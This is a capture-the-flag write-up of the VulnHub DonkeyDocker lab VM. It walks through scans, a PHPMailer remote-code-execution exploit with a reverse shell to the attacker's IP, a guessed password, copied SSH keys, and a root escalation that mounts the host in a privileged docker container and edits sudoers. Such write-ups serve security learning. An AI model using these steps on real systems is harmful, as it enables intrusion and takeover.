Vulnhub: https://www.vulnhub.com/entry/donkeydocker-1,189/

NMAP Scan:
```
# Nmap 7.50 scan initiated Mon Aug  7 00:10:11 2017 as: nmap -sC -sT -A -o scan.nmap 192.168.254.105
Nmap scan report for 192.168.254.105
Host is up (0.0016s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.5 (protocol 2.0)
| ssh-hostkey: 
|   2048 9c:38:ce:11:9c:b2:7a:48:58:c9:76:d5:b8:bd:bd:57 (RSA)
|   256 d7:5e:f2:17:bd:18:1b:9c:8c:ab:11:09:e8:a0:00:c2 (ECDSA)
|_  256 06:f0:0c:d8:bc:9b:21:95:a5:d2:70:39:08:57:b3:07 (EdDSA)
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
| http-robots.txt: 3 disallowed entries 
|_/contact.php /index.php /about.php
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Docker Donkey
MAC Address: E0:B9:A5:FD:7E:05 (AzureWave Technology)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.8
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   1.62 ms 192.168.254.105
```
So we see that there not much ports open, we then head to the web page to see whats up.

We then run a nikto scan.
```
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.254.105
+ Target Hostname:    192.168.254.105
+ Target Port:        80
+ Start Time:         2017-08-07 00:13:08 (GMT8)
---------------------------------------------------------------------------
+ Server: Apache/2.4.10 (Debian)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server leaks inodes via ETags, header found with file /robots.txt, fields: 0x4f 0x54b7789c2f500 
+ Apache/2.4.10 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7539 requests: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2017-08-07 00:13:25 (GMT8) (17 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
Seems that there isnt much happening, we thought we could see any misconfigurations.

We need to enumerate more...

(check dirb.scan for more information)

dirb http://192.168.254.103/mailer/examples/

A dirb scan gave us an interesting view, which is a PHPMailer version which is 5.2.16

We run searchsploit to see what we could make us.
```
PHPMailer 1.7 - 'Data()' Function Remote Denial of Service                                                                  | php/dos/25752.txt
PHPMailer < 5.2.18 - Remote Code Execution (Bash)                                                                           | php/webapps/40968.php
PHPMailer < 5.2.18 - Remote Code Execution (PHP)                                                                            | php/webapps/40970.php
PHPMailer < 5.2.18 - Remote Code Execution (Python)                                                                         | php/webapps/40974.py
PHPMailer < 5.2.19 - Sendmail Argument Injection (Metasploit)                                                               | multiple/webapps/41688.rb
PHPMailer < 5.2.20 - Remote Code Execution                                                                                  | php/webapps/40969.pl
PHPMailer < 5.2.20 / SwiftMailer < 5.4.5-DEV / Zend Framework / zend-mail < 2.4.11 - (AIO) 'PwnScriptum' Remote Code Execut | php/webapps/40986.py
PHPMailer < 5.2.20 with Exim MTA - Remote Code Execution                                                                    | php/webapps/42221.py
WordPress PHPMailer 4.6 - Host Header Command Injection (Metasploit)   
```
We decide to use the Python version (40974.py).

We edit the following parameters:
target = 192.168.254.105/contact <- our target
payload = 192.168.254.102 <- our local ip : 4444 <- the port we will listen to

After that, we save the file then run our program.

python 40974.py
```
_____________________________________________________________________________________
 █████╗ ███╗   ██╗ █████╗ ██████╗  ██████╗ ██████╗ ██████╗ ███████╗██████╗ 
██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔══██╗
███████║██╔██╗ ██║███████║██████╔╝██║     ██║   ██║██║  ██║█████╗  ██████╔╝
██╔══██║██║╚██╗██║██╔══██║██╔══██╗██║     ██║   ██║██║  ██║██╔══╝  ██╔══██╗
██║  ██║██║ ╚████║██║  ██║██║  ██║╚██████╗╚██████╔╝██████╔╝███████╗██║  ██║
╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝
      PHPMailer Exploit CVE 2016-10033 - anarcoder at protonmail.com
 Version 1.0 - github.com/anarcoder - greetings opsxcq & David Golunski

[+] SeNdiNG eVIl SHeLL To TaRGeT....
[+] SPaWNiNG eVIL sHeLL..... bOOOOM :D
_____________________________________________________________________________________
```
Success.
We run: nc lvp -4444

After waiting for a few moments we have a reverse shell.
```
$ whoami
www-data
```
To spawn a proper shell we use Python's tty
```
python -c 'import pty; pty.spawn("/bin/sh")'
```
Now time to look around to see what may interest us.

So after looking for flags we coudn't find one but when we go to /home/ there
is a directory named smith, but we do not have the permissions to access him.

drwx------ 1 smith users 4096 Mar 26 10:33 smith

Time for us to take a smoke break and take a step further and see the bigger picture.

Okay so far no luck on finding several hints or clues on several directories, perhaps
/home/smith is our way to go.

After several tries of accessing smith by using su, the password itself is smith.

smith@12081bd067cc:/www$ whoami
whoami
smith

We then find our very first flag ;)

cat flag.txt
This is not the end, sorry dude. Look deeper!
I know nobody created a user into a docker
container but who cares? ;-)

But good work!
Here a flag for you: flag0{9fe3ed7d67635868567e290c6a490f8e}

PS: I like 1984 written by George ORWELL


So he gave a hint, which he likes 1984 by George Orwell perhaps 
searching the book may give us more hints, or perhaps even deeper.

A quick search on Google:

Nineteen Eighty-Four, often published as 1984, is a dystopian novel published in 1949 by English 
author George Orwell. The novel is set in Airstrip One (formerly known as Great Britain), 
a province of the superstate Oceania in a world of perpetual war, omnipresent government surveillance,
and public manipulation.

So after taking a few steps back, mingling with other directories I could not find any interest on the given hint.
Then I decided to see smith's directory to check any other crumbs left.

We move to smith's .ssh files here's to some interest (finally)
```
-rwx------ 1 smith users  101 Mar 22 05:01 authorized_keys
-rwx------ 1 smith users  411 Mar 22 04:48 id_ed25519
-rwx------ 1 smith users  101 Mar 22 04:48 id_ed25519.pub
```
We then copy the ssh keys to our local machine, then ssh our way through.

Welcome to

  ___           _            ___          _
 |   \ ___ _ _ | |_____ _  _|   \ ___  __| |_____ _ _
 | |) / _ \ ' \| / / -_) || | |) / _ \/ _| / / -_) '_|
 |___/\___/_||_|_\_\___|\_, |___/\___/\__|_\_\___|_|
                        |__/
                             Made with <3 v.1.0 - 2017

This is my first boot2root - CTF VM. I hope you enjoy it.
if you run into any issue you can find me on Twitter: @dhn_
or feel free to write me a mail to:

 - Email: dhn@zer0-day.pw
 - GPG key: 0x2641123C
 - GPG fingerprint: 4E3444A11BB780F84B58E8ABA8DD99472641123C

Level:       I think the level of this boot2root challange
             is hard or intermediate.

Try harder!: If you are confused or frustrated don't forget
             that enumeration is the key!

Thanks:      Special thanks to @1nternaut for the awesome
             CTF VM name!

Feedback:    This is my first boot2root - CTF VM, please
             give me feedback on how to improve!

Looking forward to the write-ups!


donkeydocker:~$ whoami
orwell

uname -a
Linux donkeydocker 4.9.17-0-grsec #1-Alpine SMP Thu Mar 23 09:59:13 GMT 2017 x86_64 Linux

Gives us the machine information
We might have a docker in our hands, says the name itself ;)

Let's see more.

donkeydocker:~$ id
uid=1000(orwell) gid=1000(orwell) groups=101(docker),1000(orwell)

Yep we're on group docker.

Now time for us to break out of this container and do some priv esc,
So far I have not done any priv esc on Docker, let's give it a go!

We played around a bit with Docker.

docker run --privileged --interactive --tty --volume /:/host bash
bash-4.4# echo "orwell ALL=(ALL) NOPASSWD: ALL" > /host/etc/sudoers.d/foo
bash-4.4# exit
exit
donkeydocker:~$ sudo -i
donkeydocker:~# hostname
donkeydocker
donkeydocker:~# whoami
root


And we got root! Time to find final flag (i think).
donkeydocker:~# ls
donkeydocker  flag.txt
donkeydocker:~# cat flag.txt 
YES!! You did it :-). Congratulations!

I hope you enjoyed this CTF VM.

Drop me a line on twitter @dhn_, or via email dhn@zer0-day.pw

Here is your flag: flag2{60d14feef575bacf5fd8eb06ec7cd8e7}
________________________
END
________________________

I enjoyed doing the CTF, it was fun to play around with Docker.
